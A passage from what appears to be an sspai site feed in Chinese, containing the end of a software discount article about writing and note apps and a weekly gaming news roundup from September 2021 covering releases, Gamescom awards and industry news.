target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>每个人都有文字记录的需求，但每个人在文字记录过程中的具体需要又不尽相同。数字时代，无论是只需寥寥数字的日常便签还是数十万字的鸿篇巨著，背后都需要一个稳定、方便而高效的工具作为载体——文本编辑应用。</p>\n<p>各平台上都有非常棒的文本编辑应用（或者说写作工具），比如 Mac 上的 UIysses 和 iOS 上的 Bear，它们都能给文字工作者带来安心舒适的体验。那么 Android 上有没有同样优秀的文本编辑应用呢？今天要介绍的纯纯写作就是我的答案。</p>\n<p>便签，备忘和笔记都是轻量记录的典型应用场景，于我而言满足这些使用场景的应用首先要满足的就是一个字——快。</p>\n<p>纯纯写作本身是一个非常轻量的应用，拥有精简的代码和组件库，没有广告和后台服务，可以做到随时随地秒开应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2018/11/27/cbfc73d776c161b11a684ad14fee61e4.gif\" alt=\"启动速度很快，打开即可记录\"></figure><p>此外纯纯写作也为快速记录做了专门优化，比如状态栏磁贴快速打开应用、打开应用默认进入编辑界面、退出/后台立即保存内容等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2018/11/27/cffe7964b775b27a00e9e780fa42dbfb.gif\" alt=\"经过优化的快速记录功能\"></figure><p>无论在哪个平台，这种轻快的使用体验都鲜有同类应用能够做到。有了纯纯写作，每次上课需要做笔记的时候我都会打开它来快速记录，写完直接后台划掉卡片，丝毫不用担心数据保存和后台耗电的问题。</p>\n<p>不需要定时提醒的备忘和便签我也用它来记录，养成习惯后比起使用同类应用真的会感觉轻松不少。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/51173\">可能是 Android 平台最好用的写作工具：纯纯写作</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"48\" type=\"genuineSoftware\"> </span><h2>滴墨书摘</h2>\n<ul>\n<li>💰 价格：一年订阅 <s>¥88</s>→¥70.4</li>\n<li>📱 支持平台：iOS、Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/57#202\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=643024850320\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>如果你还在因为读书笔记散落在不同地方而头疼，滴墨书摘或许就是你正在找的应用。滴墨书摘是一款具备 OCR 识别功能的笔记管理应用。界面美观简洁，打开 app 登录之后，任意点点你都会得到唯一一个指令：设定好一本书，把你划过线的地方摘录下来、加上评注，引导明确能快速上手，不会被充斥过多信息的界面搞得没耐性。以书籍为单位做摘录的设计让我有一种仪式感，我会为了累积出成就感刻意去走这个流程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/20190524163550.jpeg\" alt=\"\"></figure><p>如果你有 Kindle 阅读器，拿滴墨书摘来统一归档电子书的笔记也是个不错的方法，只要登录 <a href=\"https://kindle.shimonote.net/\" target=\"_blank\">kindle.shimonote.net</a> 网页，把 Kindle 阅读器 Documents 文件夹里的 My Clippings.txt 按要求上传，就能把笔记导入到对应的笔记本中。值得称道的是，如果笔记有了增补，滴墨书摘只会导入新增的部分。</p>\n<p>建立好的摘录可以分享，有五类主题的背景选择，都很简约，任意一张搭配上文字，出来的效果都不会太差，文青们可以一用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2019/05/22/c6d4592bee2b7a292d1169e7678c2360.jpg\" alt=\"\"></figure><p>关联阅读：<a href=\"https://sspai.com/post/54888\">用滴墨书摘让读书有始有终</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"57\" type=\"genuineSoftware\"> </span><h2>更多优惠，不要错过</h2>\n<p>以下软件将于 9 月 6 日至 9 月 22 日开启开学季活动，如果你遇到了心仪的软件，不妨保持关注，不要错过。</p>\n<ul>\n<li>\n<a href=\"https://sspai.com/item/4\" target=\"_blank\">Downie 工具升值包</a>：¥79 → ¥59.25</li>\n<li>\n<a href=\"https://sspai.com/item/96\" target=\"_blank\">HazeOver</a>：¥29 → ¥23.2</li>\n<li>\n<a href=\"https://sspai.com/item/5\" target=\"_blank\">PDF Expert</a>：¥169 → ¥119</li>\n<li>\n<a href=\"https://sspai.com/item/20\" target=\"_blank\">Adguard</a>：终生个人版 ¥88 → ¥70.4，终生家庭版 ¥250 → ¥200</li>\n</ul>\n<h2>少数派 &amp; GoodNotes 联名开学礼包</h2>\n<p>作为众多少数派喜欢的手写笔记软件，GoodNotes 特别与少数派开展限时联名活动，推出开学季专属封面和模版，以及少数派贴纸。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/02/9a98e6ad6f3d22b702d6ec1be2254b55.png\"><figcaption>少数派专属贴纸</figcaption></figure><p>即日起至 9 月 9 日，点击 <a href=\"http://qyt7tncoi.hn-bkt.clouddn.com/%E5%B0%91%E6%95%B0%E6%B4%BE%20%26%20GoodNotes%20%E8%81%94%E5%90%8D%E5%BC%80%E5%AD%A6%E7%A4%BC%E5%8C%85.zip\">下载链接</a>，即可获取联名开学礼包。更多关于开学礼包的活动介绍与使用指南，请前往 <a href=\"https://sspai.com/post/68589\" target=\"_blank\">GoodNotes 专栏</a> 查看。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68504"},{"title":"瞎玩菌的游戏周报：《脑航员 2》上市、科隆游戏展大奖等","date":"2021-09-03 07:22:21","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.9.3 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>享乐</h2>\n<p>「享乐（yuè ）」版块是为了推荐好的游戏音乐，「享」字体现「分享」音乐和「享受」音乐两重意思。我衷心希望也许有人因为音乐从而对游戏产生兴趣（我就是）。也欢迎读者评论推荐你们喜欢的游戏音乐，我将会在后续的游戏周报中分享。</p>\n<h3>《Chicory: A Colorful Tale》 - Lena Raine</h3>\n<p>你可以在 <a href=\"https://radicaldreamland.bandcamp.com/album/chicory-a-colorful-tale-original-soundtrack\" target=\"_blank\">Bandcamp</a> | <a href=\"https://open.spotify.com/album/6DdR2sAfxq6qhsYhVIa83Q?si=FOn2XFTtTdm4PG7Lsl_3nQ&amp;dl_branch=1\" target=\"_blank\">Spotify</a> | <a href=\"https://music.youtube.com/playlist?list=OLAK5uy_mrdl3v2dcRWfzDaIIjRWsH0KBWJ9Y8rVc\" target=\"_blank\">YouTube Music</a> | <a href=\"https://y.qq.com/n/ryqq/albumDetail/001fvam01Ykat1\" target=\"_blank\">QQ 音乐</a> | <a href=\"https://music.163.com/#/album?id=128666943\" target=\"_blank\">网易云音乐</a> 收听这张游戏音乐原声专辑，或者按名称在你喜欢的音乐服务中搜索。为方便你在文章页面内直接播放，下面是这张专辑的在线播放版本：</p> <h2>简讯</h2>\n<p>「简讯」版块是为了控制游戏周报的篇幅，并保持足够的信息量。大部分时候瞎玩菌尽量用一句话浓缩信息，也可能不止一句话。感兴趣的读者可以点击每条新闻末尾的链接符号 🔗 以了解更多信息。</p>\n<h3>《脑航员 2》上市</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqudb34t82dsrfmt0.png\"></figure><p>《脑航员 2》（Psychonauts 2）已于 8 月 25 日上市，并公布了上市预告片。你可以在 PS5（向下兼容）/ PS4 / Xbox Series X|S / Xbox One / PC 平台玩到这款游戏。这款游戏已包含在 Xbox Game Pass 阵容内。 <a href=\"https://www.youtube.com/watch?v=YmAUMT403os\" target=\"_blank\">🔗</a></p> <h3>言论：游戏订阅制可能将彻底取代零售制</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqulb34t813bf0va0.jpeg\"></figure><p>开发了《脑航员 2》（Psychonauts 2）的 Double Fine 工作室负责人 Tim Schafer 认为电子游戏的订阅服务越来越受欢迎和突出，它们完全接管只是时间问题。他在接受 GameIndustry.biz 采访时说，对订阅服务的推动是「不可阻挡的」，他认为这已经发生在电影和音乐上，而游戏可能是下一个。此前 Double Fine 工作室已经被微软收购，并且《脑航员 2》也在游戏首发日就加入 Xbox Game Pass 这项游戏订阅服务。 <a href=\"https://www.gamesindustry.biz/articles/2021-08-24-inside-the-mind-of-tim-schafer\" target=\"_blank\">🔗</a></p>\n<h3>Netflix 游戏订阅服务在 Android 平台测试</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqutb34t82dsrfmtg.jpeg\"></figure><p>Netflix 在波兰的 Google Play 商店测试其游戏服务，只要是 Netflix 的订阅会员就可以免费下载 《怪奇物语：1984》（Stranger Things: 1984）和《怪奇物语 3》（Stranger Things 3: The Game）这两款游戏。后者原本在 Google Play 上售价 9.99 美元。Netflix 官方确认这两款游戏没有广告也没有内购。</p>\n<p>从这次测试可以看出关于 Netflix 游戏订阅服务的 3 点信息，解答了瞎玩菌心中的一些问题：</p>\n<ol>\n<li>这个服务的定位不像 Xbox Game Pass，更像 Apple Arcade。因为首次测试是在移动平台，而非主机 / PC 平台；而且官方宣称无广告无内购，这个宣传点跟 Apple Arcade 高度一致。</li>\n<li>没有通过云游戏的串流方式来玩游戏（就像 Netflix 的影视流媒体那样），而是需要下载、安装游戏。</li>\n<li>没有通过 Netflix 自身的应用来分发下载游戏（技术上没有困难），而是通过 Google Play 商店下载。 <a href=\"https://twitter.com/NetflixPL/status/1430895506427764762\" target=\"_blank\">🔗</a>\n</li>\n</ol>\n<h3>科隆游戏展大奖获奖名单</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqv5b34t818p9aod0.jpeg\"></figure><p>科隆游戏展大奖（Gamescom Awards）公布了所有奖项的获奖名单，其中令玩家们饱含期待的《艾尔登法环》《光环 无限》《黑道圣徒》重启作都获得了多个奖项，但是除此之外，瞎玩菌个人比较喜欢最佳独立游戏的获得者《迷失随机》（注：<a href=\"https://sspai.com/post/67977\" target=\"_blank\">7 月 30 日的游戏周报</a> 曾经介绍过这款游戏）。</p>\n<p>限于篇幅，瞎玩菌在此仅摘录一部分，完整名单可以查看末尾的链接。</p>\n<ul>\n<li>最佳动作冒险游戏：《艾尔登法环》（Elden Ring）</li>\n<li>最佳动作游戏：《孤岛惊魂 6》（Far Cry 6）</li>\n<li>最佳家庭游戏：《超级地下城制造》（Super Dungeon Maker）</li>\n<li>最佳独立游戏：《迷失随机》（Lost in Random）</li>\n<li>最佳角色扮演游戏：《艾尔登法环》（Elden Ring）</li>\n<li>最佳模拟游戏：《Park Beyond》</li>\n<li>最佳运动游戏：《极限国度》（Riders Republic）</li>\n<li>最佳策略游戏：《帝国时代 4》（Age of Empires IV）</li>\n<li>最佳多人游戏：《光环 无限》（Halo Infinite）</li>\n<li>最佳持续运营游戏：《Apex 英雄》（Apex Legends）</li>\n<li>最佳原创游戏：《骰子遗产》（Dice Legacy）</li>\n<li>最佳 Xbox 游戏：《光环 无限》（Halo Infinite）</li>\n<li>最佳 Switch 游戏：《马里奥 + 疯狂兔子星耀之愿》（Mario + Rabbids Sparks of Hope）</li>\n<li>最佳 PC 游戏：《塞伯利亚：前世界》（Syberia: The World Before）</li>\n<li>最佳 Playstation 游戏：《艾尔登法环》（Elden Ring）</li>\n<li>消费者奖 - 科隆游戏展「最高通缉」（gamescom \"Most Wanted\"）：《艾尔登法环》（Elden Ring）</li>\n<li>科隆游戏展全球大奖 - 最佳公布：公布了《黑道圣徒》重启作的开发商 Volition / 发行商 Deep Silver</li>\n<li>科隆游戏展全球大奖 - 最佳预告片：《黑道圣徒》重启作。你可以在 <a href=\"https://www.youtube.com/watch?v=YgjzDJA1o1E\" target=\"_blank\">YouTube</a> | <a href=\"https://www.bilibili.com/video/BV1U3411B7zB\" target=\"_blank\">哔哩哔哩</a> 观看这部预告片。</li>\n<li>科隆游戏展全球大奖 - 科隆游戏展全场最佳： 来自万代南梦宫欧洲的《艾尔登法环》（Elden Ring）。 <a href=\"https://www.gamescom.global/the-gamescom/gamescom-award/gamescom-award-2021/#gamescom-global-awards\" target=\"_blank\">🔗</a>\n</li>\n</ul>\n<h3>《黑道圣徒》重启作</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqvdb34t813bf0vag.jpeg\"></figure><p>《黑道圣徒》重启作将于 2022 年 2 月 25 日发售，登陆 PS5 / PS4 / Xbox Series X|S / Xbox One / Epic 平台。这一作的名字就叫《黑道圣徒》（Saints Row），没有副标题，也没有第 X 代，这是因为开发者认为之前的《黑道圣徒》系列已经把自己的叙事逼到了角落，最近一作《黑道圣徒 4》甚至讲到了外星人入侵，当你通关时，你已经成为了银河系的统治者，所以他们认为这个系列需要一次重启，回到根源。在这款游戏中，玩家将带领一群 Z 世代的犯罪大亨接管一个全新的城市，这个腐败的、类似拉斯维加斯的游乐场名为「圣都伊莱索」（Santo Ileso）。瞎玩菌没看错吧，这个城市的名字跟「洛圣都」（Los Santos）看上去好像差不多，是不是意味着什么？ <a href=\"https://www.youtube.com/watch?v=YgjzDJA1o1E\" target=\"_blank\">🔗</a></p> <h3>《光环 无限》主题的 Xbox 硬件</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqvlb34t82k08gaag.jpeg\"></figure><p>为庆祝《光环》20 周年，微软推出了限定的《光环 无限》（Halo Infinite）主题 Xbox Series X 主机套装，以及精英手柄二代。其中 Xbox Series X 主机套装现已在 <a href=\"https://www.xbox.com/en-US/consoles/xbox-series-x/halo-infinite-limited-edition\" target=\"_blank\">微软商店</a> 开启预售，定价 549.99 美元。这款限定版主机除了外观上的特色，还在开机、关机音效上使用了《光环》主题的自定义声音，并且顶部风扇的灯光由绿色改为了蓝色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqvtb34t82dsrfmu0.jpeg\"></figure><p>限定版的二代精英手柄官方定价 199.99 美元，也将发售 <a href=\"https://weibo.com/5203472552/Kvo2pt6XQ\" target=\"_blank\">国行版</a>，不过限定版主机套装还没有明确是否发售国行版。</p>\n<p>限定版主机套装和二代精英手柄都将在 2021 年 11 月 15 日正式发售（包括国行版的二代精英手柄也是）。 <a href=\"https://www.xbox.com/en-US/consoles/xbox-series-x/halo-infinite-limited-edition\" target=\"_blank\">🔗</a></p> <h3>《地平线：西之绝境》延期</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onqvtb34t818p9aodg.jpeg\"></figure><p>《地平线 西之绝境》（Horizon Forbidden West）延期至 2022 年 2 月 18 日发售，<a href=\"https://store.playstation.com/zh-hant-hk/concept/10000886/\" target=\"_blank\">预售</a> 于 2021 年 9 月 2 日开启。瞎玩菌看原本今年能玩到的游戏，差不多有一半都延期了。 <a href=\"https://twitter.com/Guerrilla/status/1430611047308677123\" target=\"_blank\">🔗</a></p>\n<h3>《死亡搁浅 导演剪辑版》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr0db34t813bf0vb0.png\"></figure><p>《死亡搁浅 导演剪辑版》（Death Stranding: Director's Cut）在科隆游戏展公布了新的预告片，介绍了新内容的更多细节。这款游戏将于 9 月 24 日发售，并且现在就可以 <a href=\"https://store.playstation.com/concept/234585/\" target=\"_blank\">预购</a>。</p>\n<p>小岛秀夫并不喜欢这个名字，因为游戏内容没有剪掉，反而新增了很多，他认为更恰当的名字应该叫《死亡搁浅 扩展版》（Death Stranding: Expanded Edition）。 <a href=\"https://www.youtube.com/watch?v=-usmP3hjK8k\" target=\"_blank\">🔗</a></p> <h3>传闻：《死亡搁浅》续作</h3>\n<p>「弩哥」透露正在与小岛工作室商谈再次出演《死亡搁浅》主角一职，也许《死亡搁浅》的续作正在开发。 <a href=\"https://br.ign.com/death-stranding-ps4/92573/feature/death-stranding-2-norman-reedus-indica-sequencia\" target=\"_blank\">🔗</a></p>\n<h3>言论：小岛秀夫谈游戏摄影</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr0lb34t818p9aoe0.png\"></figure><p>小岛秀夫近日在自己的 Twitter 上这么说：</p>\n<blockquote>\n<p>仍然有一些人取笑别人在游戏中拍摄照片。如果你坚持拍照，哪怕在游戏中拍照，你的敏感度和技能自然会提高。包括构图、布局、对焦等等。</p>\n<p>最重要的是，你会知道你想拍什么。之后，当你用真正的相机或智能手机拍摄时，游戏中的经验肯定会派上用场。</p>\n</blockquote>\n<p>你赞同小岛的说法吗？ <a href=\"https://twitter.com/HIDEO_KOJIMA_EN/status/1431776945000239105\" target=\"_blank\">🔗</a></p>\n<ul><li>扩展阅读：<a href=\"https://sspai.com/post/66516\" target=\"_blank\">《游戏摄影和我的故事：在电子游戏中寻找定格的艺术》</a>\n</li></ul>\n<h3>《英灵神殿》重大更新</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr0tb34t82k08gab0.png\"></figure><p>《英灵神殿》（Valheim）的重大更新「灶与家」（Hearth &amp; Home）将于 9 月 16 日上线，预告片是一段好看的动画。这次更新包含能让大家的游戏方式更多元化的新内容，包括新的家具，建材，食物等等。 <a href=\"https://store.steampowered.com/news/app/892970/view/2984184915223630933\" target=\"_blank\">🔗</a></p> <h3>《师父》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr1db34t813bf0vbg.png\"></figure><p>功夫题材的动作游戏《师父》（SIFU）将于 2022 年 2 月 22 日发售，登陆 PS5 / PS4 / PC（Epic） 平台。这发售日很好记，特别二。 <a href=\"https://www.youtube.com/watch?v=BpggiZQEcIo\" target=\"_blank\">🔗</a></p> <h3>《忍者神龟：施耐德的复仇》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr1lb34t818p9aoeg.png\"></figure><p>《忍者神龟：施耐德的复仇》（Teenage Mutant Ninja Turtles: Shredder’s Revenge）公布了新的实机演示预告片，女记者 April O'Neil 将参战。游戏将于 2022 年登陆 Switch / PC 平台。 <a href=\"https://www.youtube.com/watch?v=_RfrrEF1VLo\" target=\"_blank\">🔗</a></p> <h3>《多可比》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr2db34t82dsrfmug.png\"></figure><p>《多可比》（DokeV）是一款开放世界冒险游戏，看上去就像《精灵宝可梦》（Pokémon）遇上了《斯普拉遁》（Splatoon）的缝合玩法游戏。这款游戏尚在开发当中，目前看到的一切可能还有变化，而且游戏没有公布发售日期和平台。大家对这款游戏的期待度高吗？ <a href=\"https://www.youtube.com/watch?v=FaRbQHlegaM\" target=\"_blank\">🔗</a></p> <h3>《咩咩启示录》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr2lb34t818p9aof0.jpeg\"></figure><p>《咩咩启示录》（Cult of the Lamb）是 Digital Devolver 发行的一款轻度肉鸽动作游戏，游戏名字令广州玩家倍感亲切。游戏的画风和设定有点奇特，在这片虚假先知横行的土地上，你要建立自己的教派，遍历大陆上神秘无比、风格迥异的各个区域，笼络一群笃信森林的忠诚信徒，广散你的真言，最终一统全境，成为唯一的正教。这款游戏将于 2022 年登陆 PC 和主机平台。 <a href=\"https://www.cultofthelamb.com/\" target=\"_blank\">🔗</a></p> <h3>Gamera Game 发布会</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr2tb34t82dsrfmv0.jpeg\"></figure><p>在名字很长的「杀疯了的独立游戏发行公司 Gamera Game 九月要发行这么多游戏发布会」上，公开了 4 款游戏的最新情报：</p>\n<ul>\n<li>《了不起的修仙模拟器》最新 DLC 武当仙踪，将于 8 月 31 日下午 3 点在 Steam 、WeGame 双平台同步发售。</li>\n<li>国风妖怪解谜冒险游戏《山海旅人》将于 9 月 10 日下午 3 点发售。</li>\n<li>刀剑题材横版动作游戏《听风者也》将于 9 月 23 日发售。</li>\n<li>侦探题材冒险解谜游戏《蛛丝诡迹》将于 9 月 28 日发售。 <a href=\"https://weibo.com/6469614836/KvT0e74P9\" target=\"_blank\">🔗</a>\n</li>\n</ul>\n<h3>传闻：《如龙》制作人名越稔洋可能入职网易</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr35b34t82k08gabg.jpeg\"></figure><p>据彭博社报道，世嘉的《如龙》系列制作人名越稔洋，正在被网易公司挖角，并且已经到了最终协商阶段。 <a href=\"https://www.bloomberg.com/news/articles/2021-08-30/china-s-netease-in-talks-to-hire-creator-of-sega-yakuza-series\" target=\"_blank\">🔗</a></p>\n<h3>顽皮狗新作招兵买马</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr3db34t82dsrfmvg.jpeg\"></figure><p>顽皮狗工作室正在为「首款独立的多人游戏」公开招聘游戏设计师、程序员等职位。瞎玩菌猜测这也许就是《最后生还者 第二篇章》的多人模式。 <a href=\"https://twitter.com/NaughtyDogJobs/status/1431318633955790848\" target=\"_blank\">🔗</a></p>\n<h3>B 社 15 年老兵离职</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr3tb34t82k08gac0.png\"></figure><p>从 2005 年入职B 社的老员工 Jeff Gardiner 宣布离职。他说：</p>\n<blockquote><p>我在 B 社的时光已经结束了。从制作《上古卷轴 4》、《辐射 3》和《上古卷轴 5》的设计师，到《辐射 4》的首席制作人，最后到《辐射 76》的项目负责人，这是一次奇妙的旅程。我将怀念我的同事们，并想感谢那些了不起的粉丝。敬请期待。 <a href=\"https://twitter.com/jg93/status/1430893097844547600\" target=\"_blank\">🔗</a></p></blockquote>\n<h3>Steam 销量榜：那个没在</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr45b34t818p9aofg.png\"></figure><p>Steam 公布了上周的销量榜：</p>\n<p>1.《命运 2：邪姬魅影》豪华版 + Bungie 30 周年纪念组合包（Destiny 2: The Witch Queen Deluxe + Bungie 30th Anniversary Bundle）</p>\n<p>2.《异形：火力小队》（Aliens: Fireteam Elite）</p>\n<p>3.《永劫无间》（NARAKA: BLADEPOINT）</p>\n<p>4.《脑航员 2》（Psychonauts 2）</p>\n<p>5.《人类》（HUMANKIND™）</p>\n<p>6.《战地 5》（Battlefield V）</p>\n<p>7. V 社 VR 套件（Valve Index VR Kit）</p>\n<p>8.《赛博朋克 2077》（Cyberpunk 2077）</p>\n<p>9.《巫师 3 年度版》（The Witcher 3: Wild Hunt - Game of the Year Edition）</p>\n<p>10.《命运 2: 传说收藏版》（Destiny 2: Legendary Edition） <a href=\"https://steamdb.info/topsellers/2021W34/\" target=\"_blank\">🔗</a></p>\n<h3>Steam 退款让一位开发者中止工作</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr4db34t82k08gacg.jpeg\"></figure><p>独立游戏开发者 EMIKA_GAMES 声称由于游戏《<a href=\"https://store.steampowered.com/app/1609080/Summer_of_58/\" target=\"_blank\">Summer of '58</a>》在「特别好评」的状态下，收到了较多的 Steam 退款申请，导致游戏的总收入很低，甚至无法收回成本。这是因为游戏流程较短，很多玩家玩不到 2 小时就申请退款。显然 Steam 的 2 小时退款规则对这种流程短的游戏很不友好，但这位开发者声称不会为了强行增加游戏时长而狗尾续貂。最终 EMIKA_GAMES 宣布因此无限期中止开发工作，另一款开发中的游戏《From Day To Day》也不会有任何开发进展了。</p>\n<p>瞎玩菌认为，一个良性的游戏市场是由平台、玩家等多方因素决定的，而且游戏流程的长短并不影响游戏的品质，陈星汉的《Journey》就是很好的例子。无论国外还是国内，衷心希望更多玩家愿意为好的游戏体验付费，而不是打完好评却选择白嫖。白嫖怪们的行为虽然能暂时省点钱，但长期会导致形成畸形的游戏市场，如同劣币驱逐良币——看似「免费」的游戏占领市场，而需要购买却可以退款的游戏越来越少。 <a href=\"https://www.pcgamer.com/indie-dev-leaves-industry-indefinitely-thanks-to-exploitation-of-steams-refund-policy/\" target=\"_blank\">🔗</a></p>\n<h3>PS5 小幅度改进机型拆解结论：负优化</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr4lb34t82dsrfn00.jpeg\"></figure><p>在上周的游戏周报中，瞎玩菌曾提及悄悄上市的 PS5 小幅改进机型，这款机型的重量减少了约 300 克。经过 YouTube 主播 Austin Evans 拆解发现，减少的重量是因为新机型使用了更小的散热片（上图右侧为新机型）， 这导致实际运行时更热，并且功耗更高，只是噪音减小了 1 ~ 2 分贝。 <a href=\"https://www.youtube.com/watch?v=taKKVBVoKhg\" target=\"_blank\">🔗</a></p>\n<h3>《失控玩家》票房破亿</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr4tb34t82dsrfn0g.jpeg\"><figcaption>图源 <a href=\"https://weibo.com/1890650350/KvFcKaR5b\" target=\"_blank\">微博 20世纪影业</a></figcaption></figure><p>由游戏 NPC 担任主角的电影《失控玩家》内地票房在上映 3 天破亿，5 天破 2 亿。主演瑞安·雷诺兹在这之后，分别亲笔手绘了贺图，画工感人。瞎玩菌温馨提示：破 2 亿的贺图里面是绿巨人的拳头，不是西蓝花谢谢。 <a href=\"https://weibo.com/1890650350/KvFcKaR5b\" target=\"_blank\">🔗</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr55b34t818p9aog0.jpeg\"><figcaption>图源 <a href=\"https://weibo.com/1890650350/Kw1f008jQ\" target=\"_blank\">微博 20世纪影业</a></figcaption></figure><h3>《密特罗德 生存恐惧》新预告</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr5db34t813bf0vc0.png\"></figure><p>Switch 独占大作《密特罗德 生存恐惧》（Metroid Dread）公布了新预告视频，视频中展现了主角萨姐的能力和 Boss 的情报。该游戏将于 2021 年 10 月 8 日发售。 <a href=\"https://www.youtube.com/watch?v=V_XnbTayTH4\" target=\"_blank\">🔗</a></p> <h3>《暗影火炬城》实机演示</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr5tb34t82dsrfn10.png\"></figure><p>PlayStation「中国之星」计划孵化的作品《暗影火炬城》公布了 PS5 的实机演示视频，全程中文配音，时长达 19 分钟，由 IGN 独家发布。《暗影火炬城》是一款银河恶魔城动作游戏，玩家将扮演一只挥动着巨大铁拳的兔子，在柴油朋克美学的庞大世界中与军团展开激战。该游戏将在 9 月 7 日登陆 PS5 / PS4，不过 PC 版发售日还没确定。 <a href=\"https://www.bilibili.com/video/BV1UQ4y1Y7tW\" target=\"_blank\">🔗</a></p> <h3>《守望先锋》角色改名</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr65b34t82k08gad0.jpeg\"></figure><p>《守望先锋》英雄角色麦克雷（McCree）因为取自涉嫌暴雪性骚扰丑闻的前员工 Jesse McCree 名字，将会改名。而且未来不再以真实员工的名字命名游戏角色。 <a href=\"https://twitter.com/PlayOverwatch/status/1430964453865046025\" target=\"_blank\">🔗</a></p>\n<h3>《原神》线上音乐会</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr6db34t813bf0vcg.jpeg\"></figure><p>《原神》线上音乐会将于 10 月 3 日上线，届时将免费公开，首支预告片现已发布。《原神》携手指挥家 Dirk Brossé 及 Flanders Symphony Orchestra 乐团，即将带来一段美妙的音乐之旅，与旅行者共同重温那些在提瓦特大陆中回荡的动人旋律。 <a href=\"https://ys.mihoyo.com/main/news/detail/17488\" target=\"_blank\">🔗</a></p> <h3>《战地 5》骨折价</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr6tb34t818p9aogg.jpeg\"></figure><p>《战地 5》Steam 版的免费试玩活动虽然已经结束，但是《战地 5：终极版》的 1 折特价活动将持续到 9 月 9 日，原价 228 元，现价只需 22 元。虽然 Steam 上的评价褒贬不一（差评主要集中在外挂泛滥），但这价格就算只玩单人剧情模式都挺划算，想上车的玩家们请抓住这次机会，一旦错过了的话……说不定 Epic 会送呢？ <a href=\"https://store.steampowered.com/app/1238810/_5/\" target=\"_blank\">🔗</a></p>\n<h3>《使命召唤：战区》打击作弊</h3>\n<figure class=\"image ss-img-wrapper\"><img 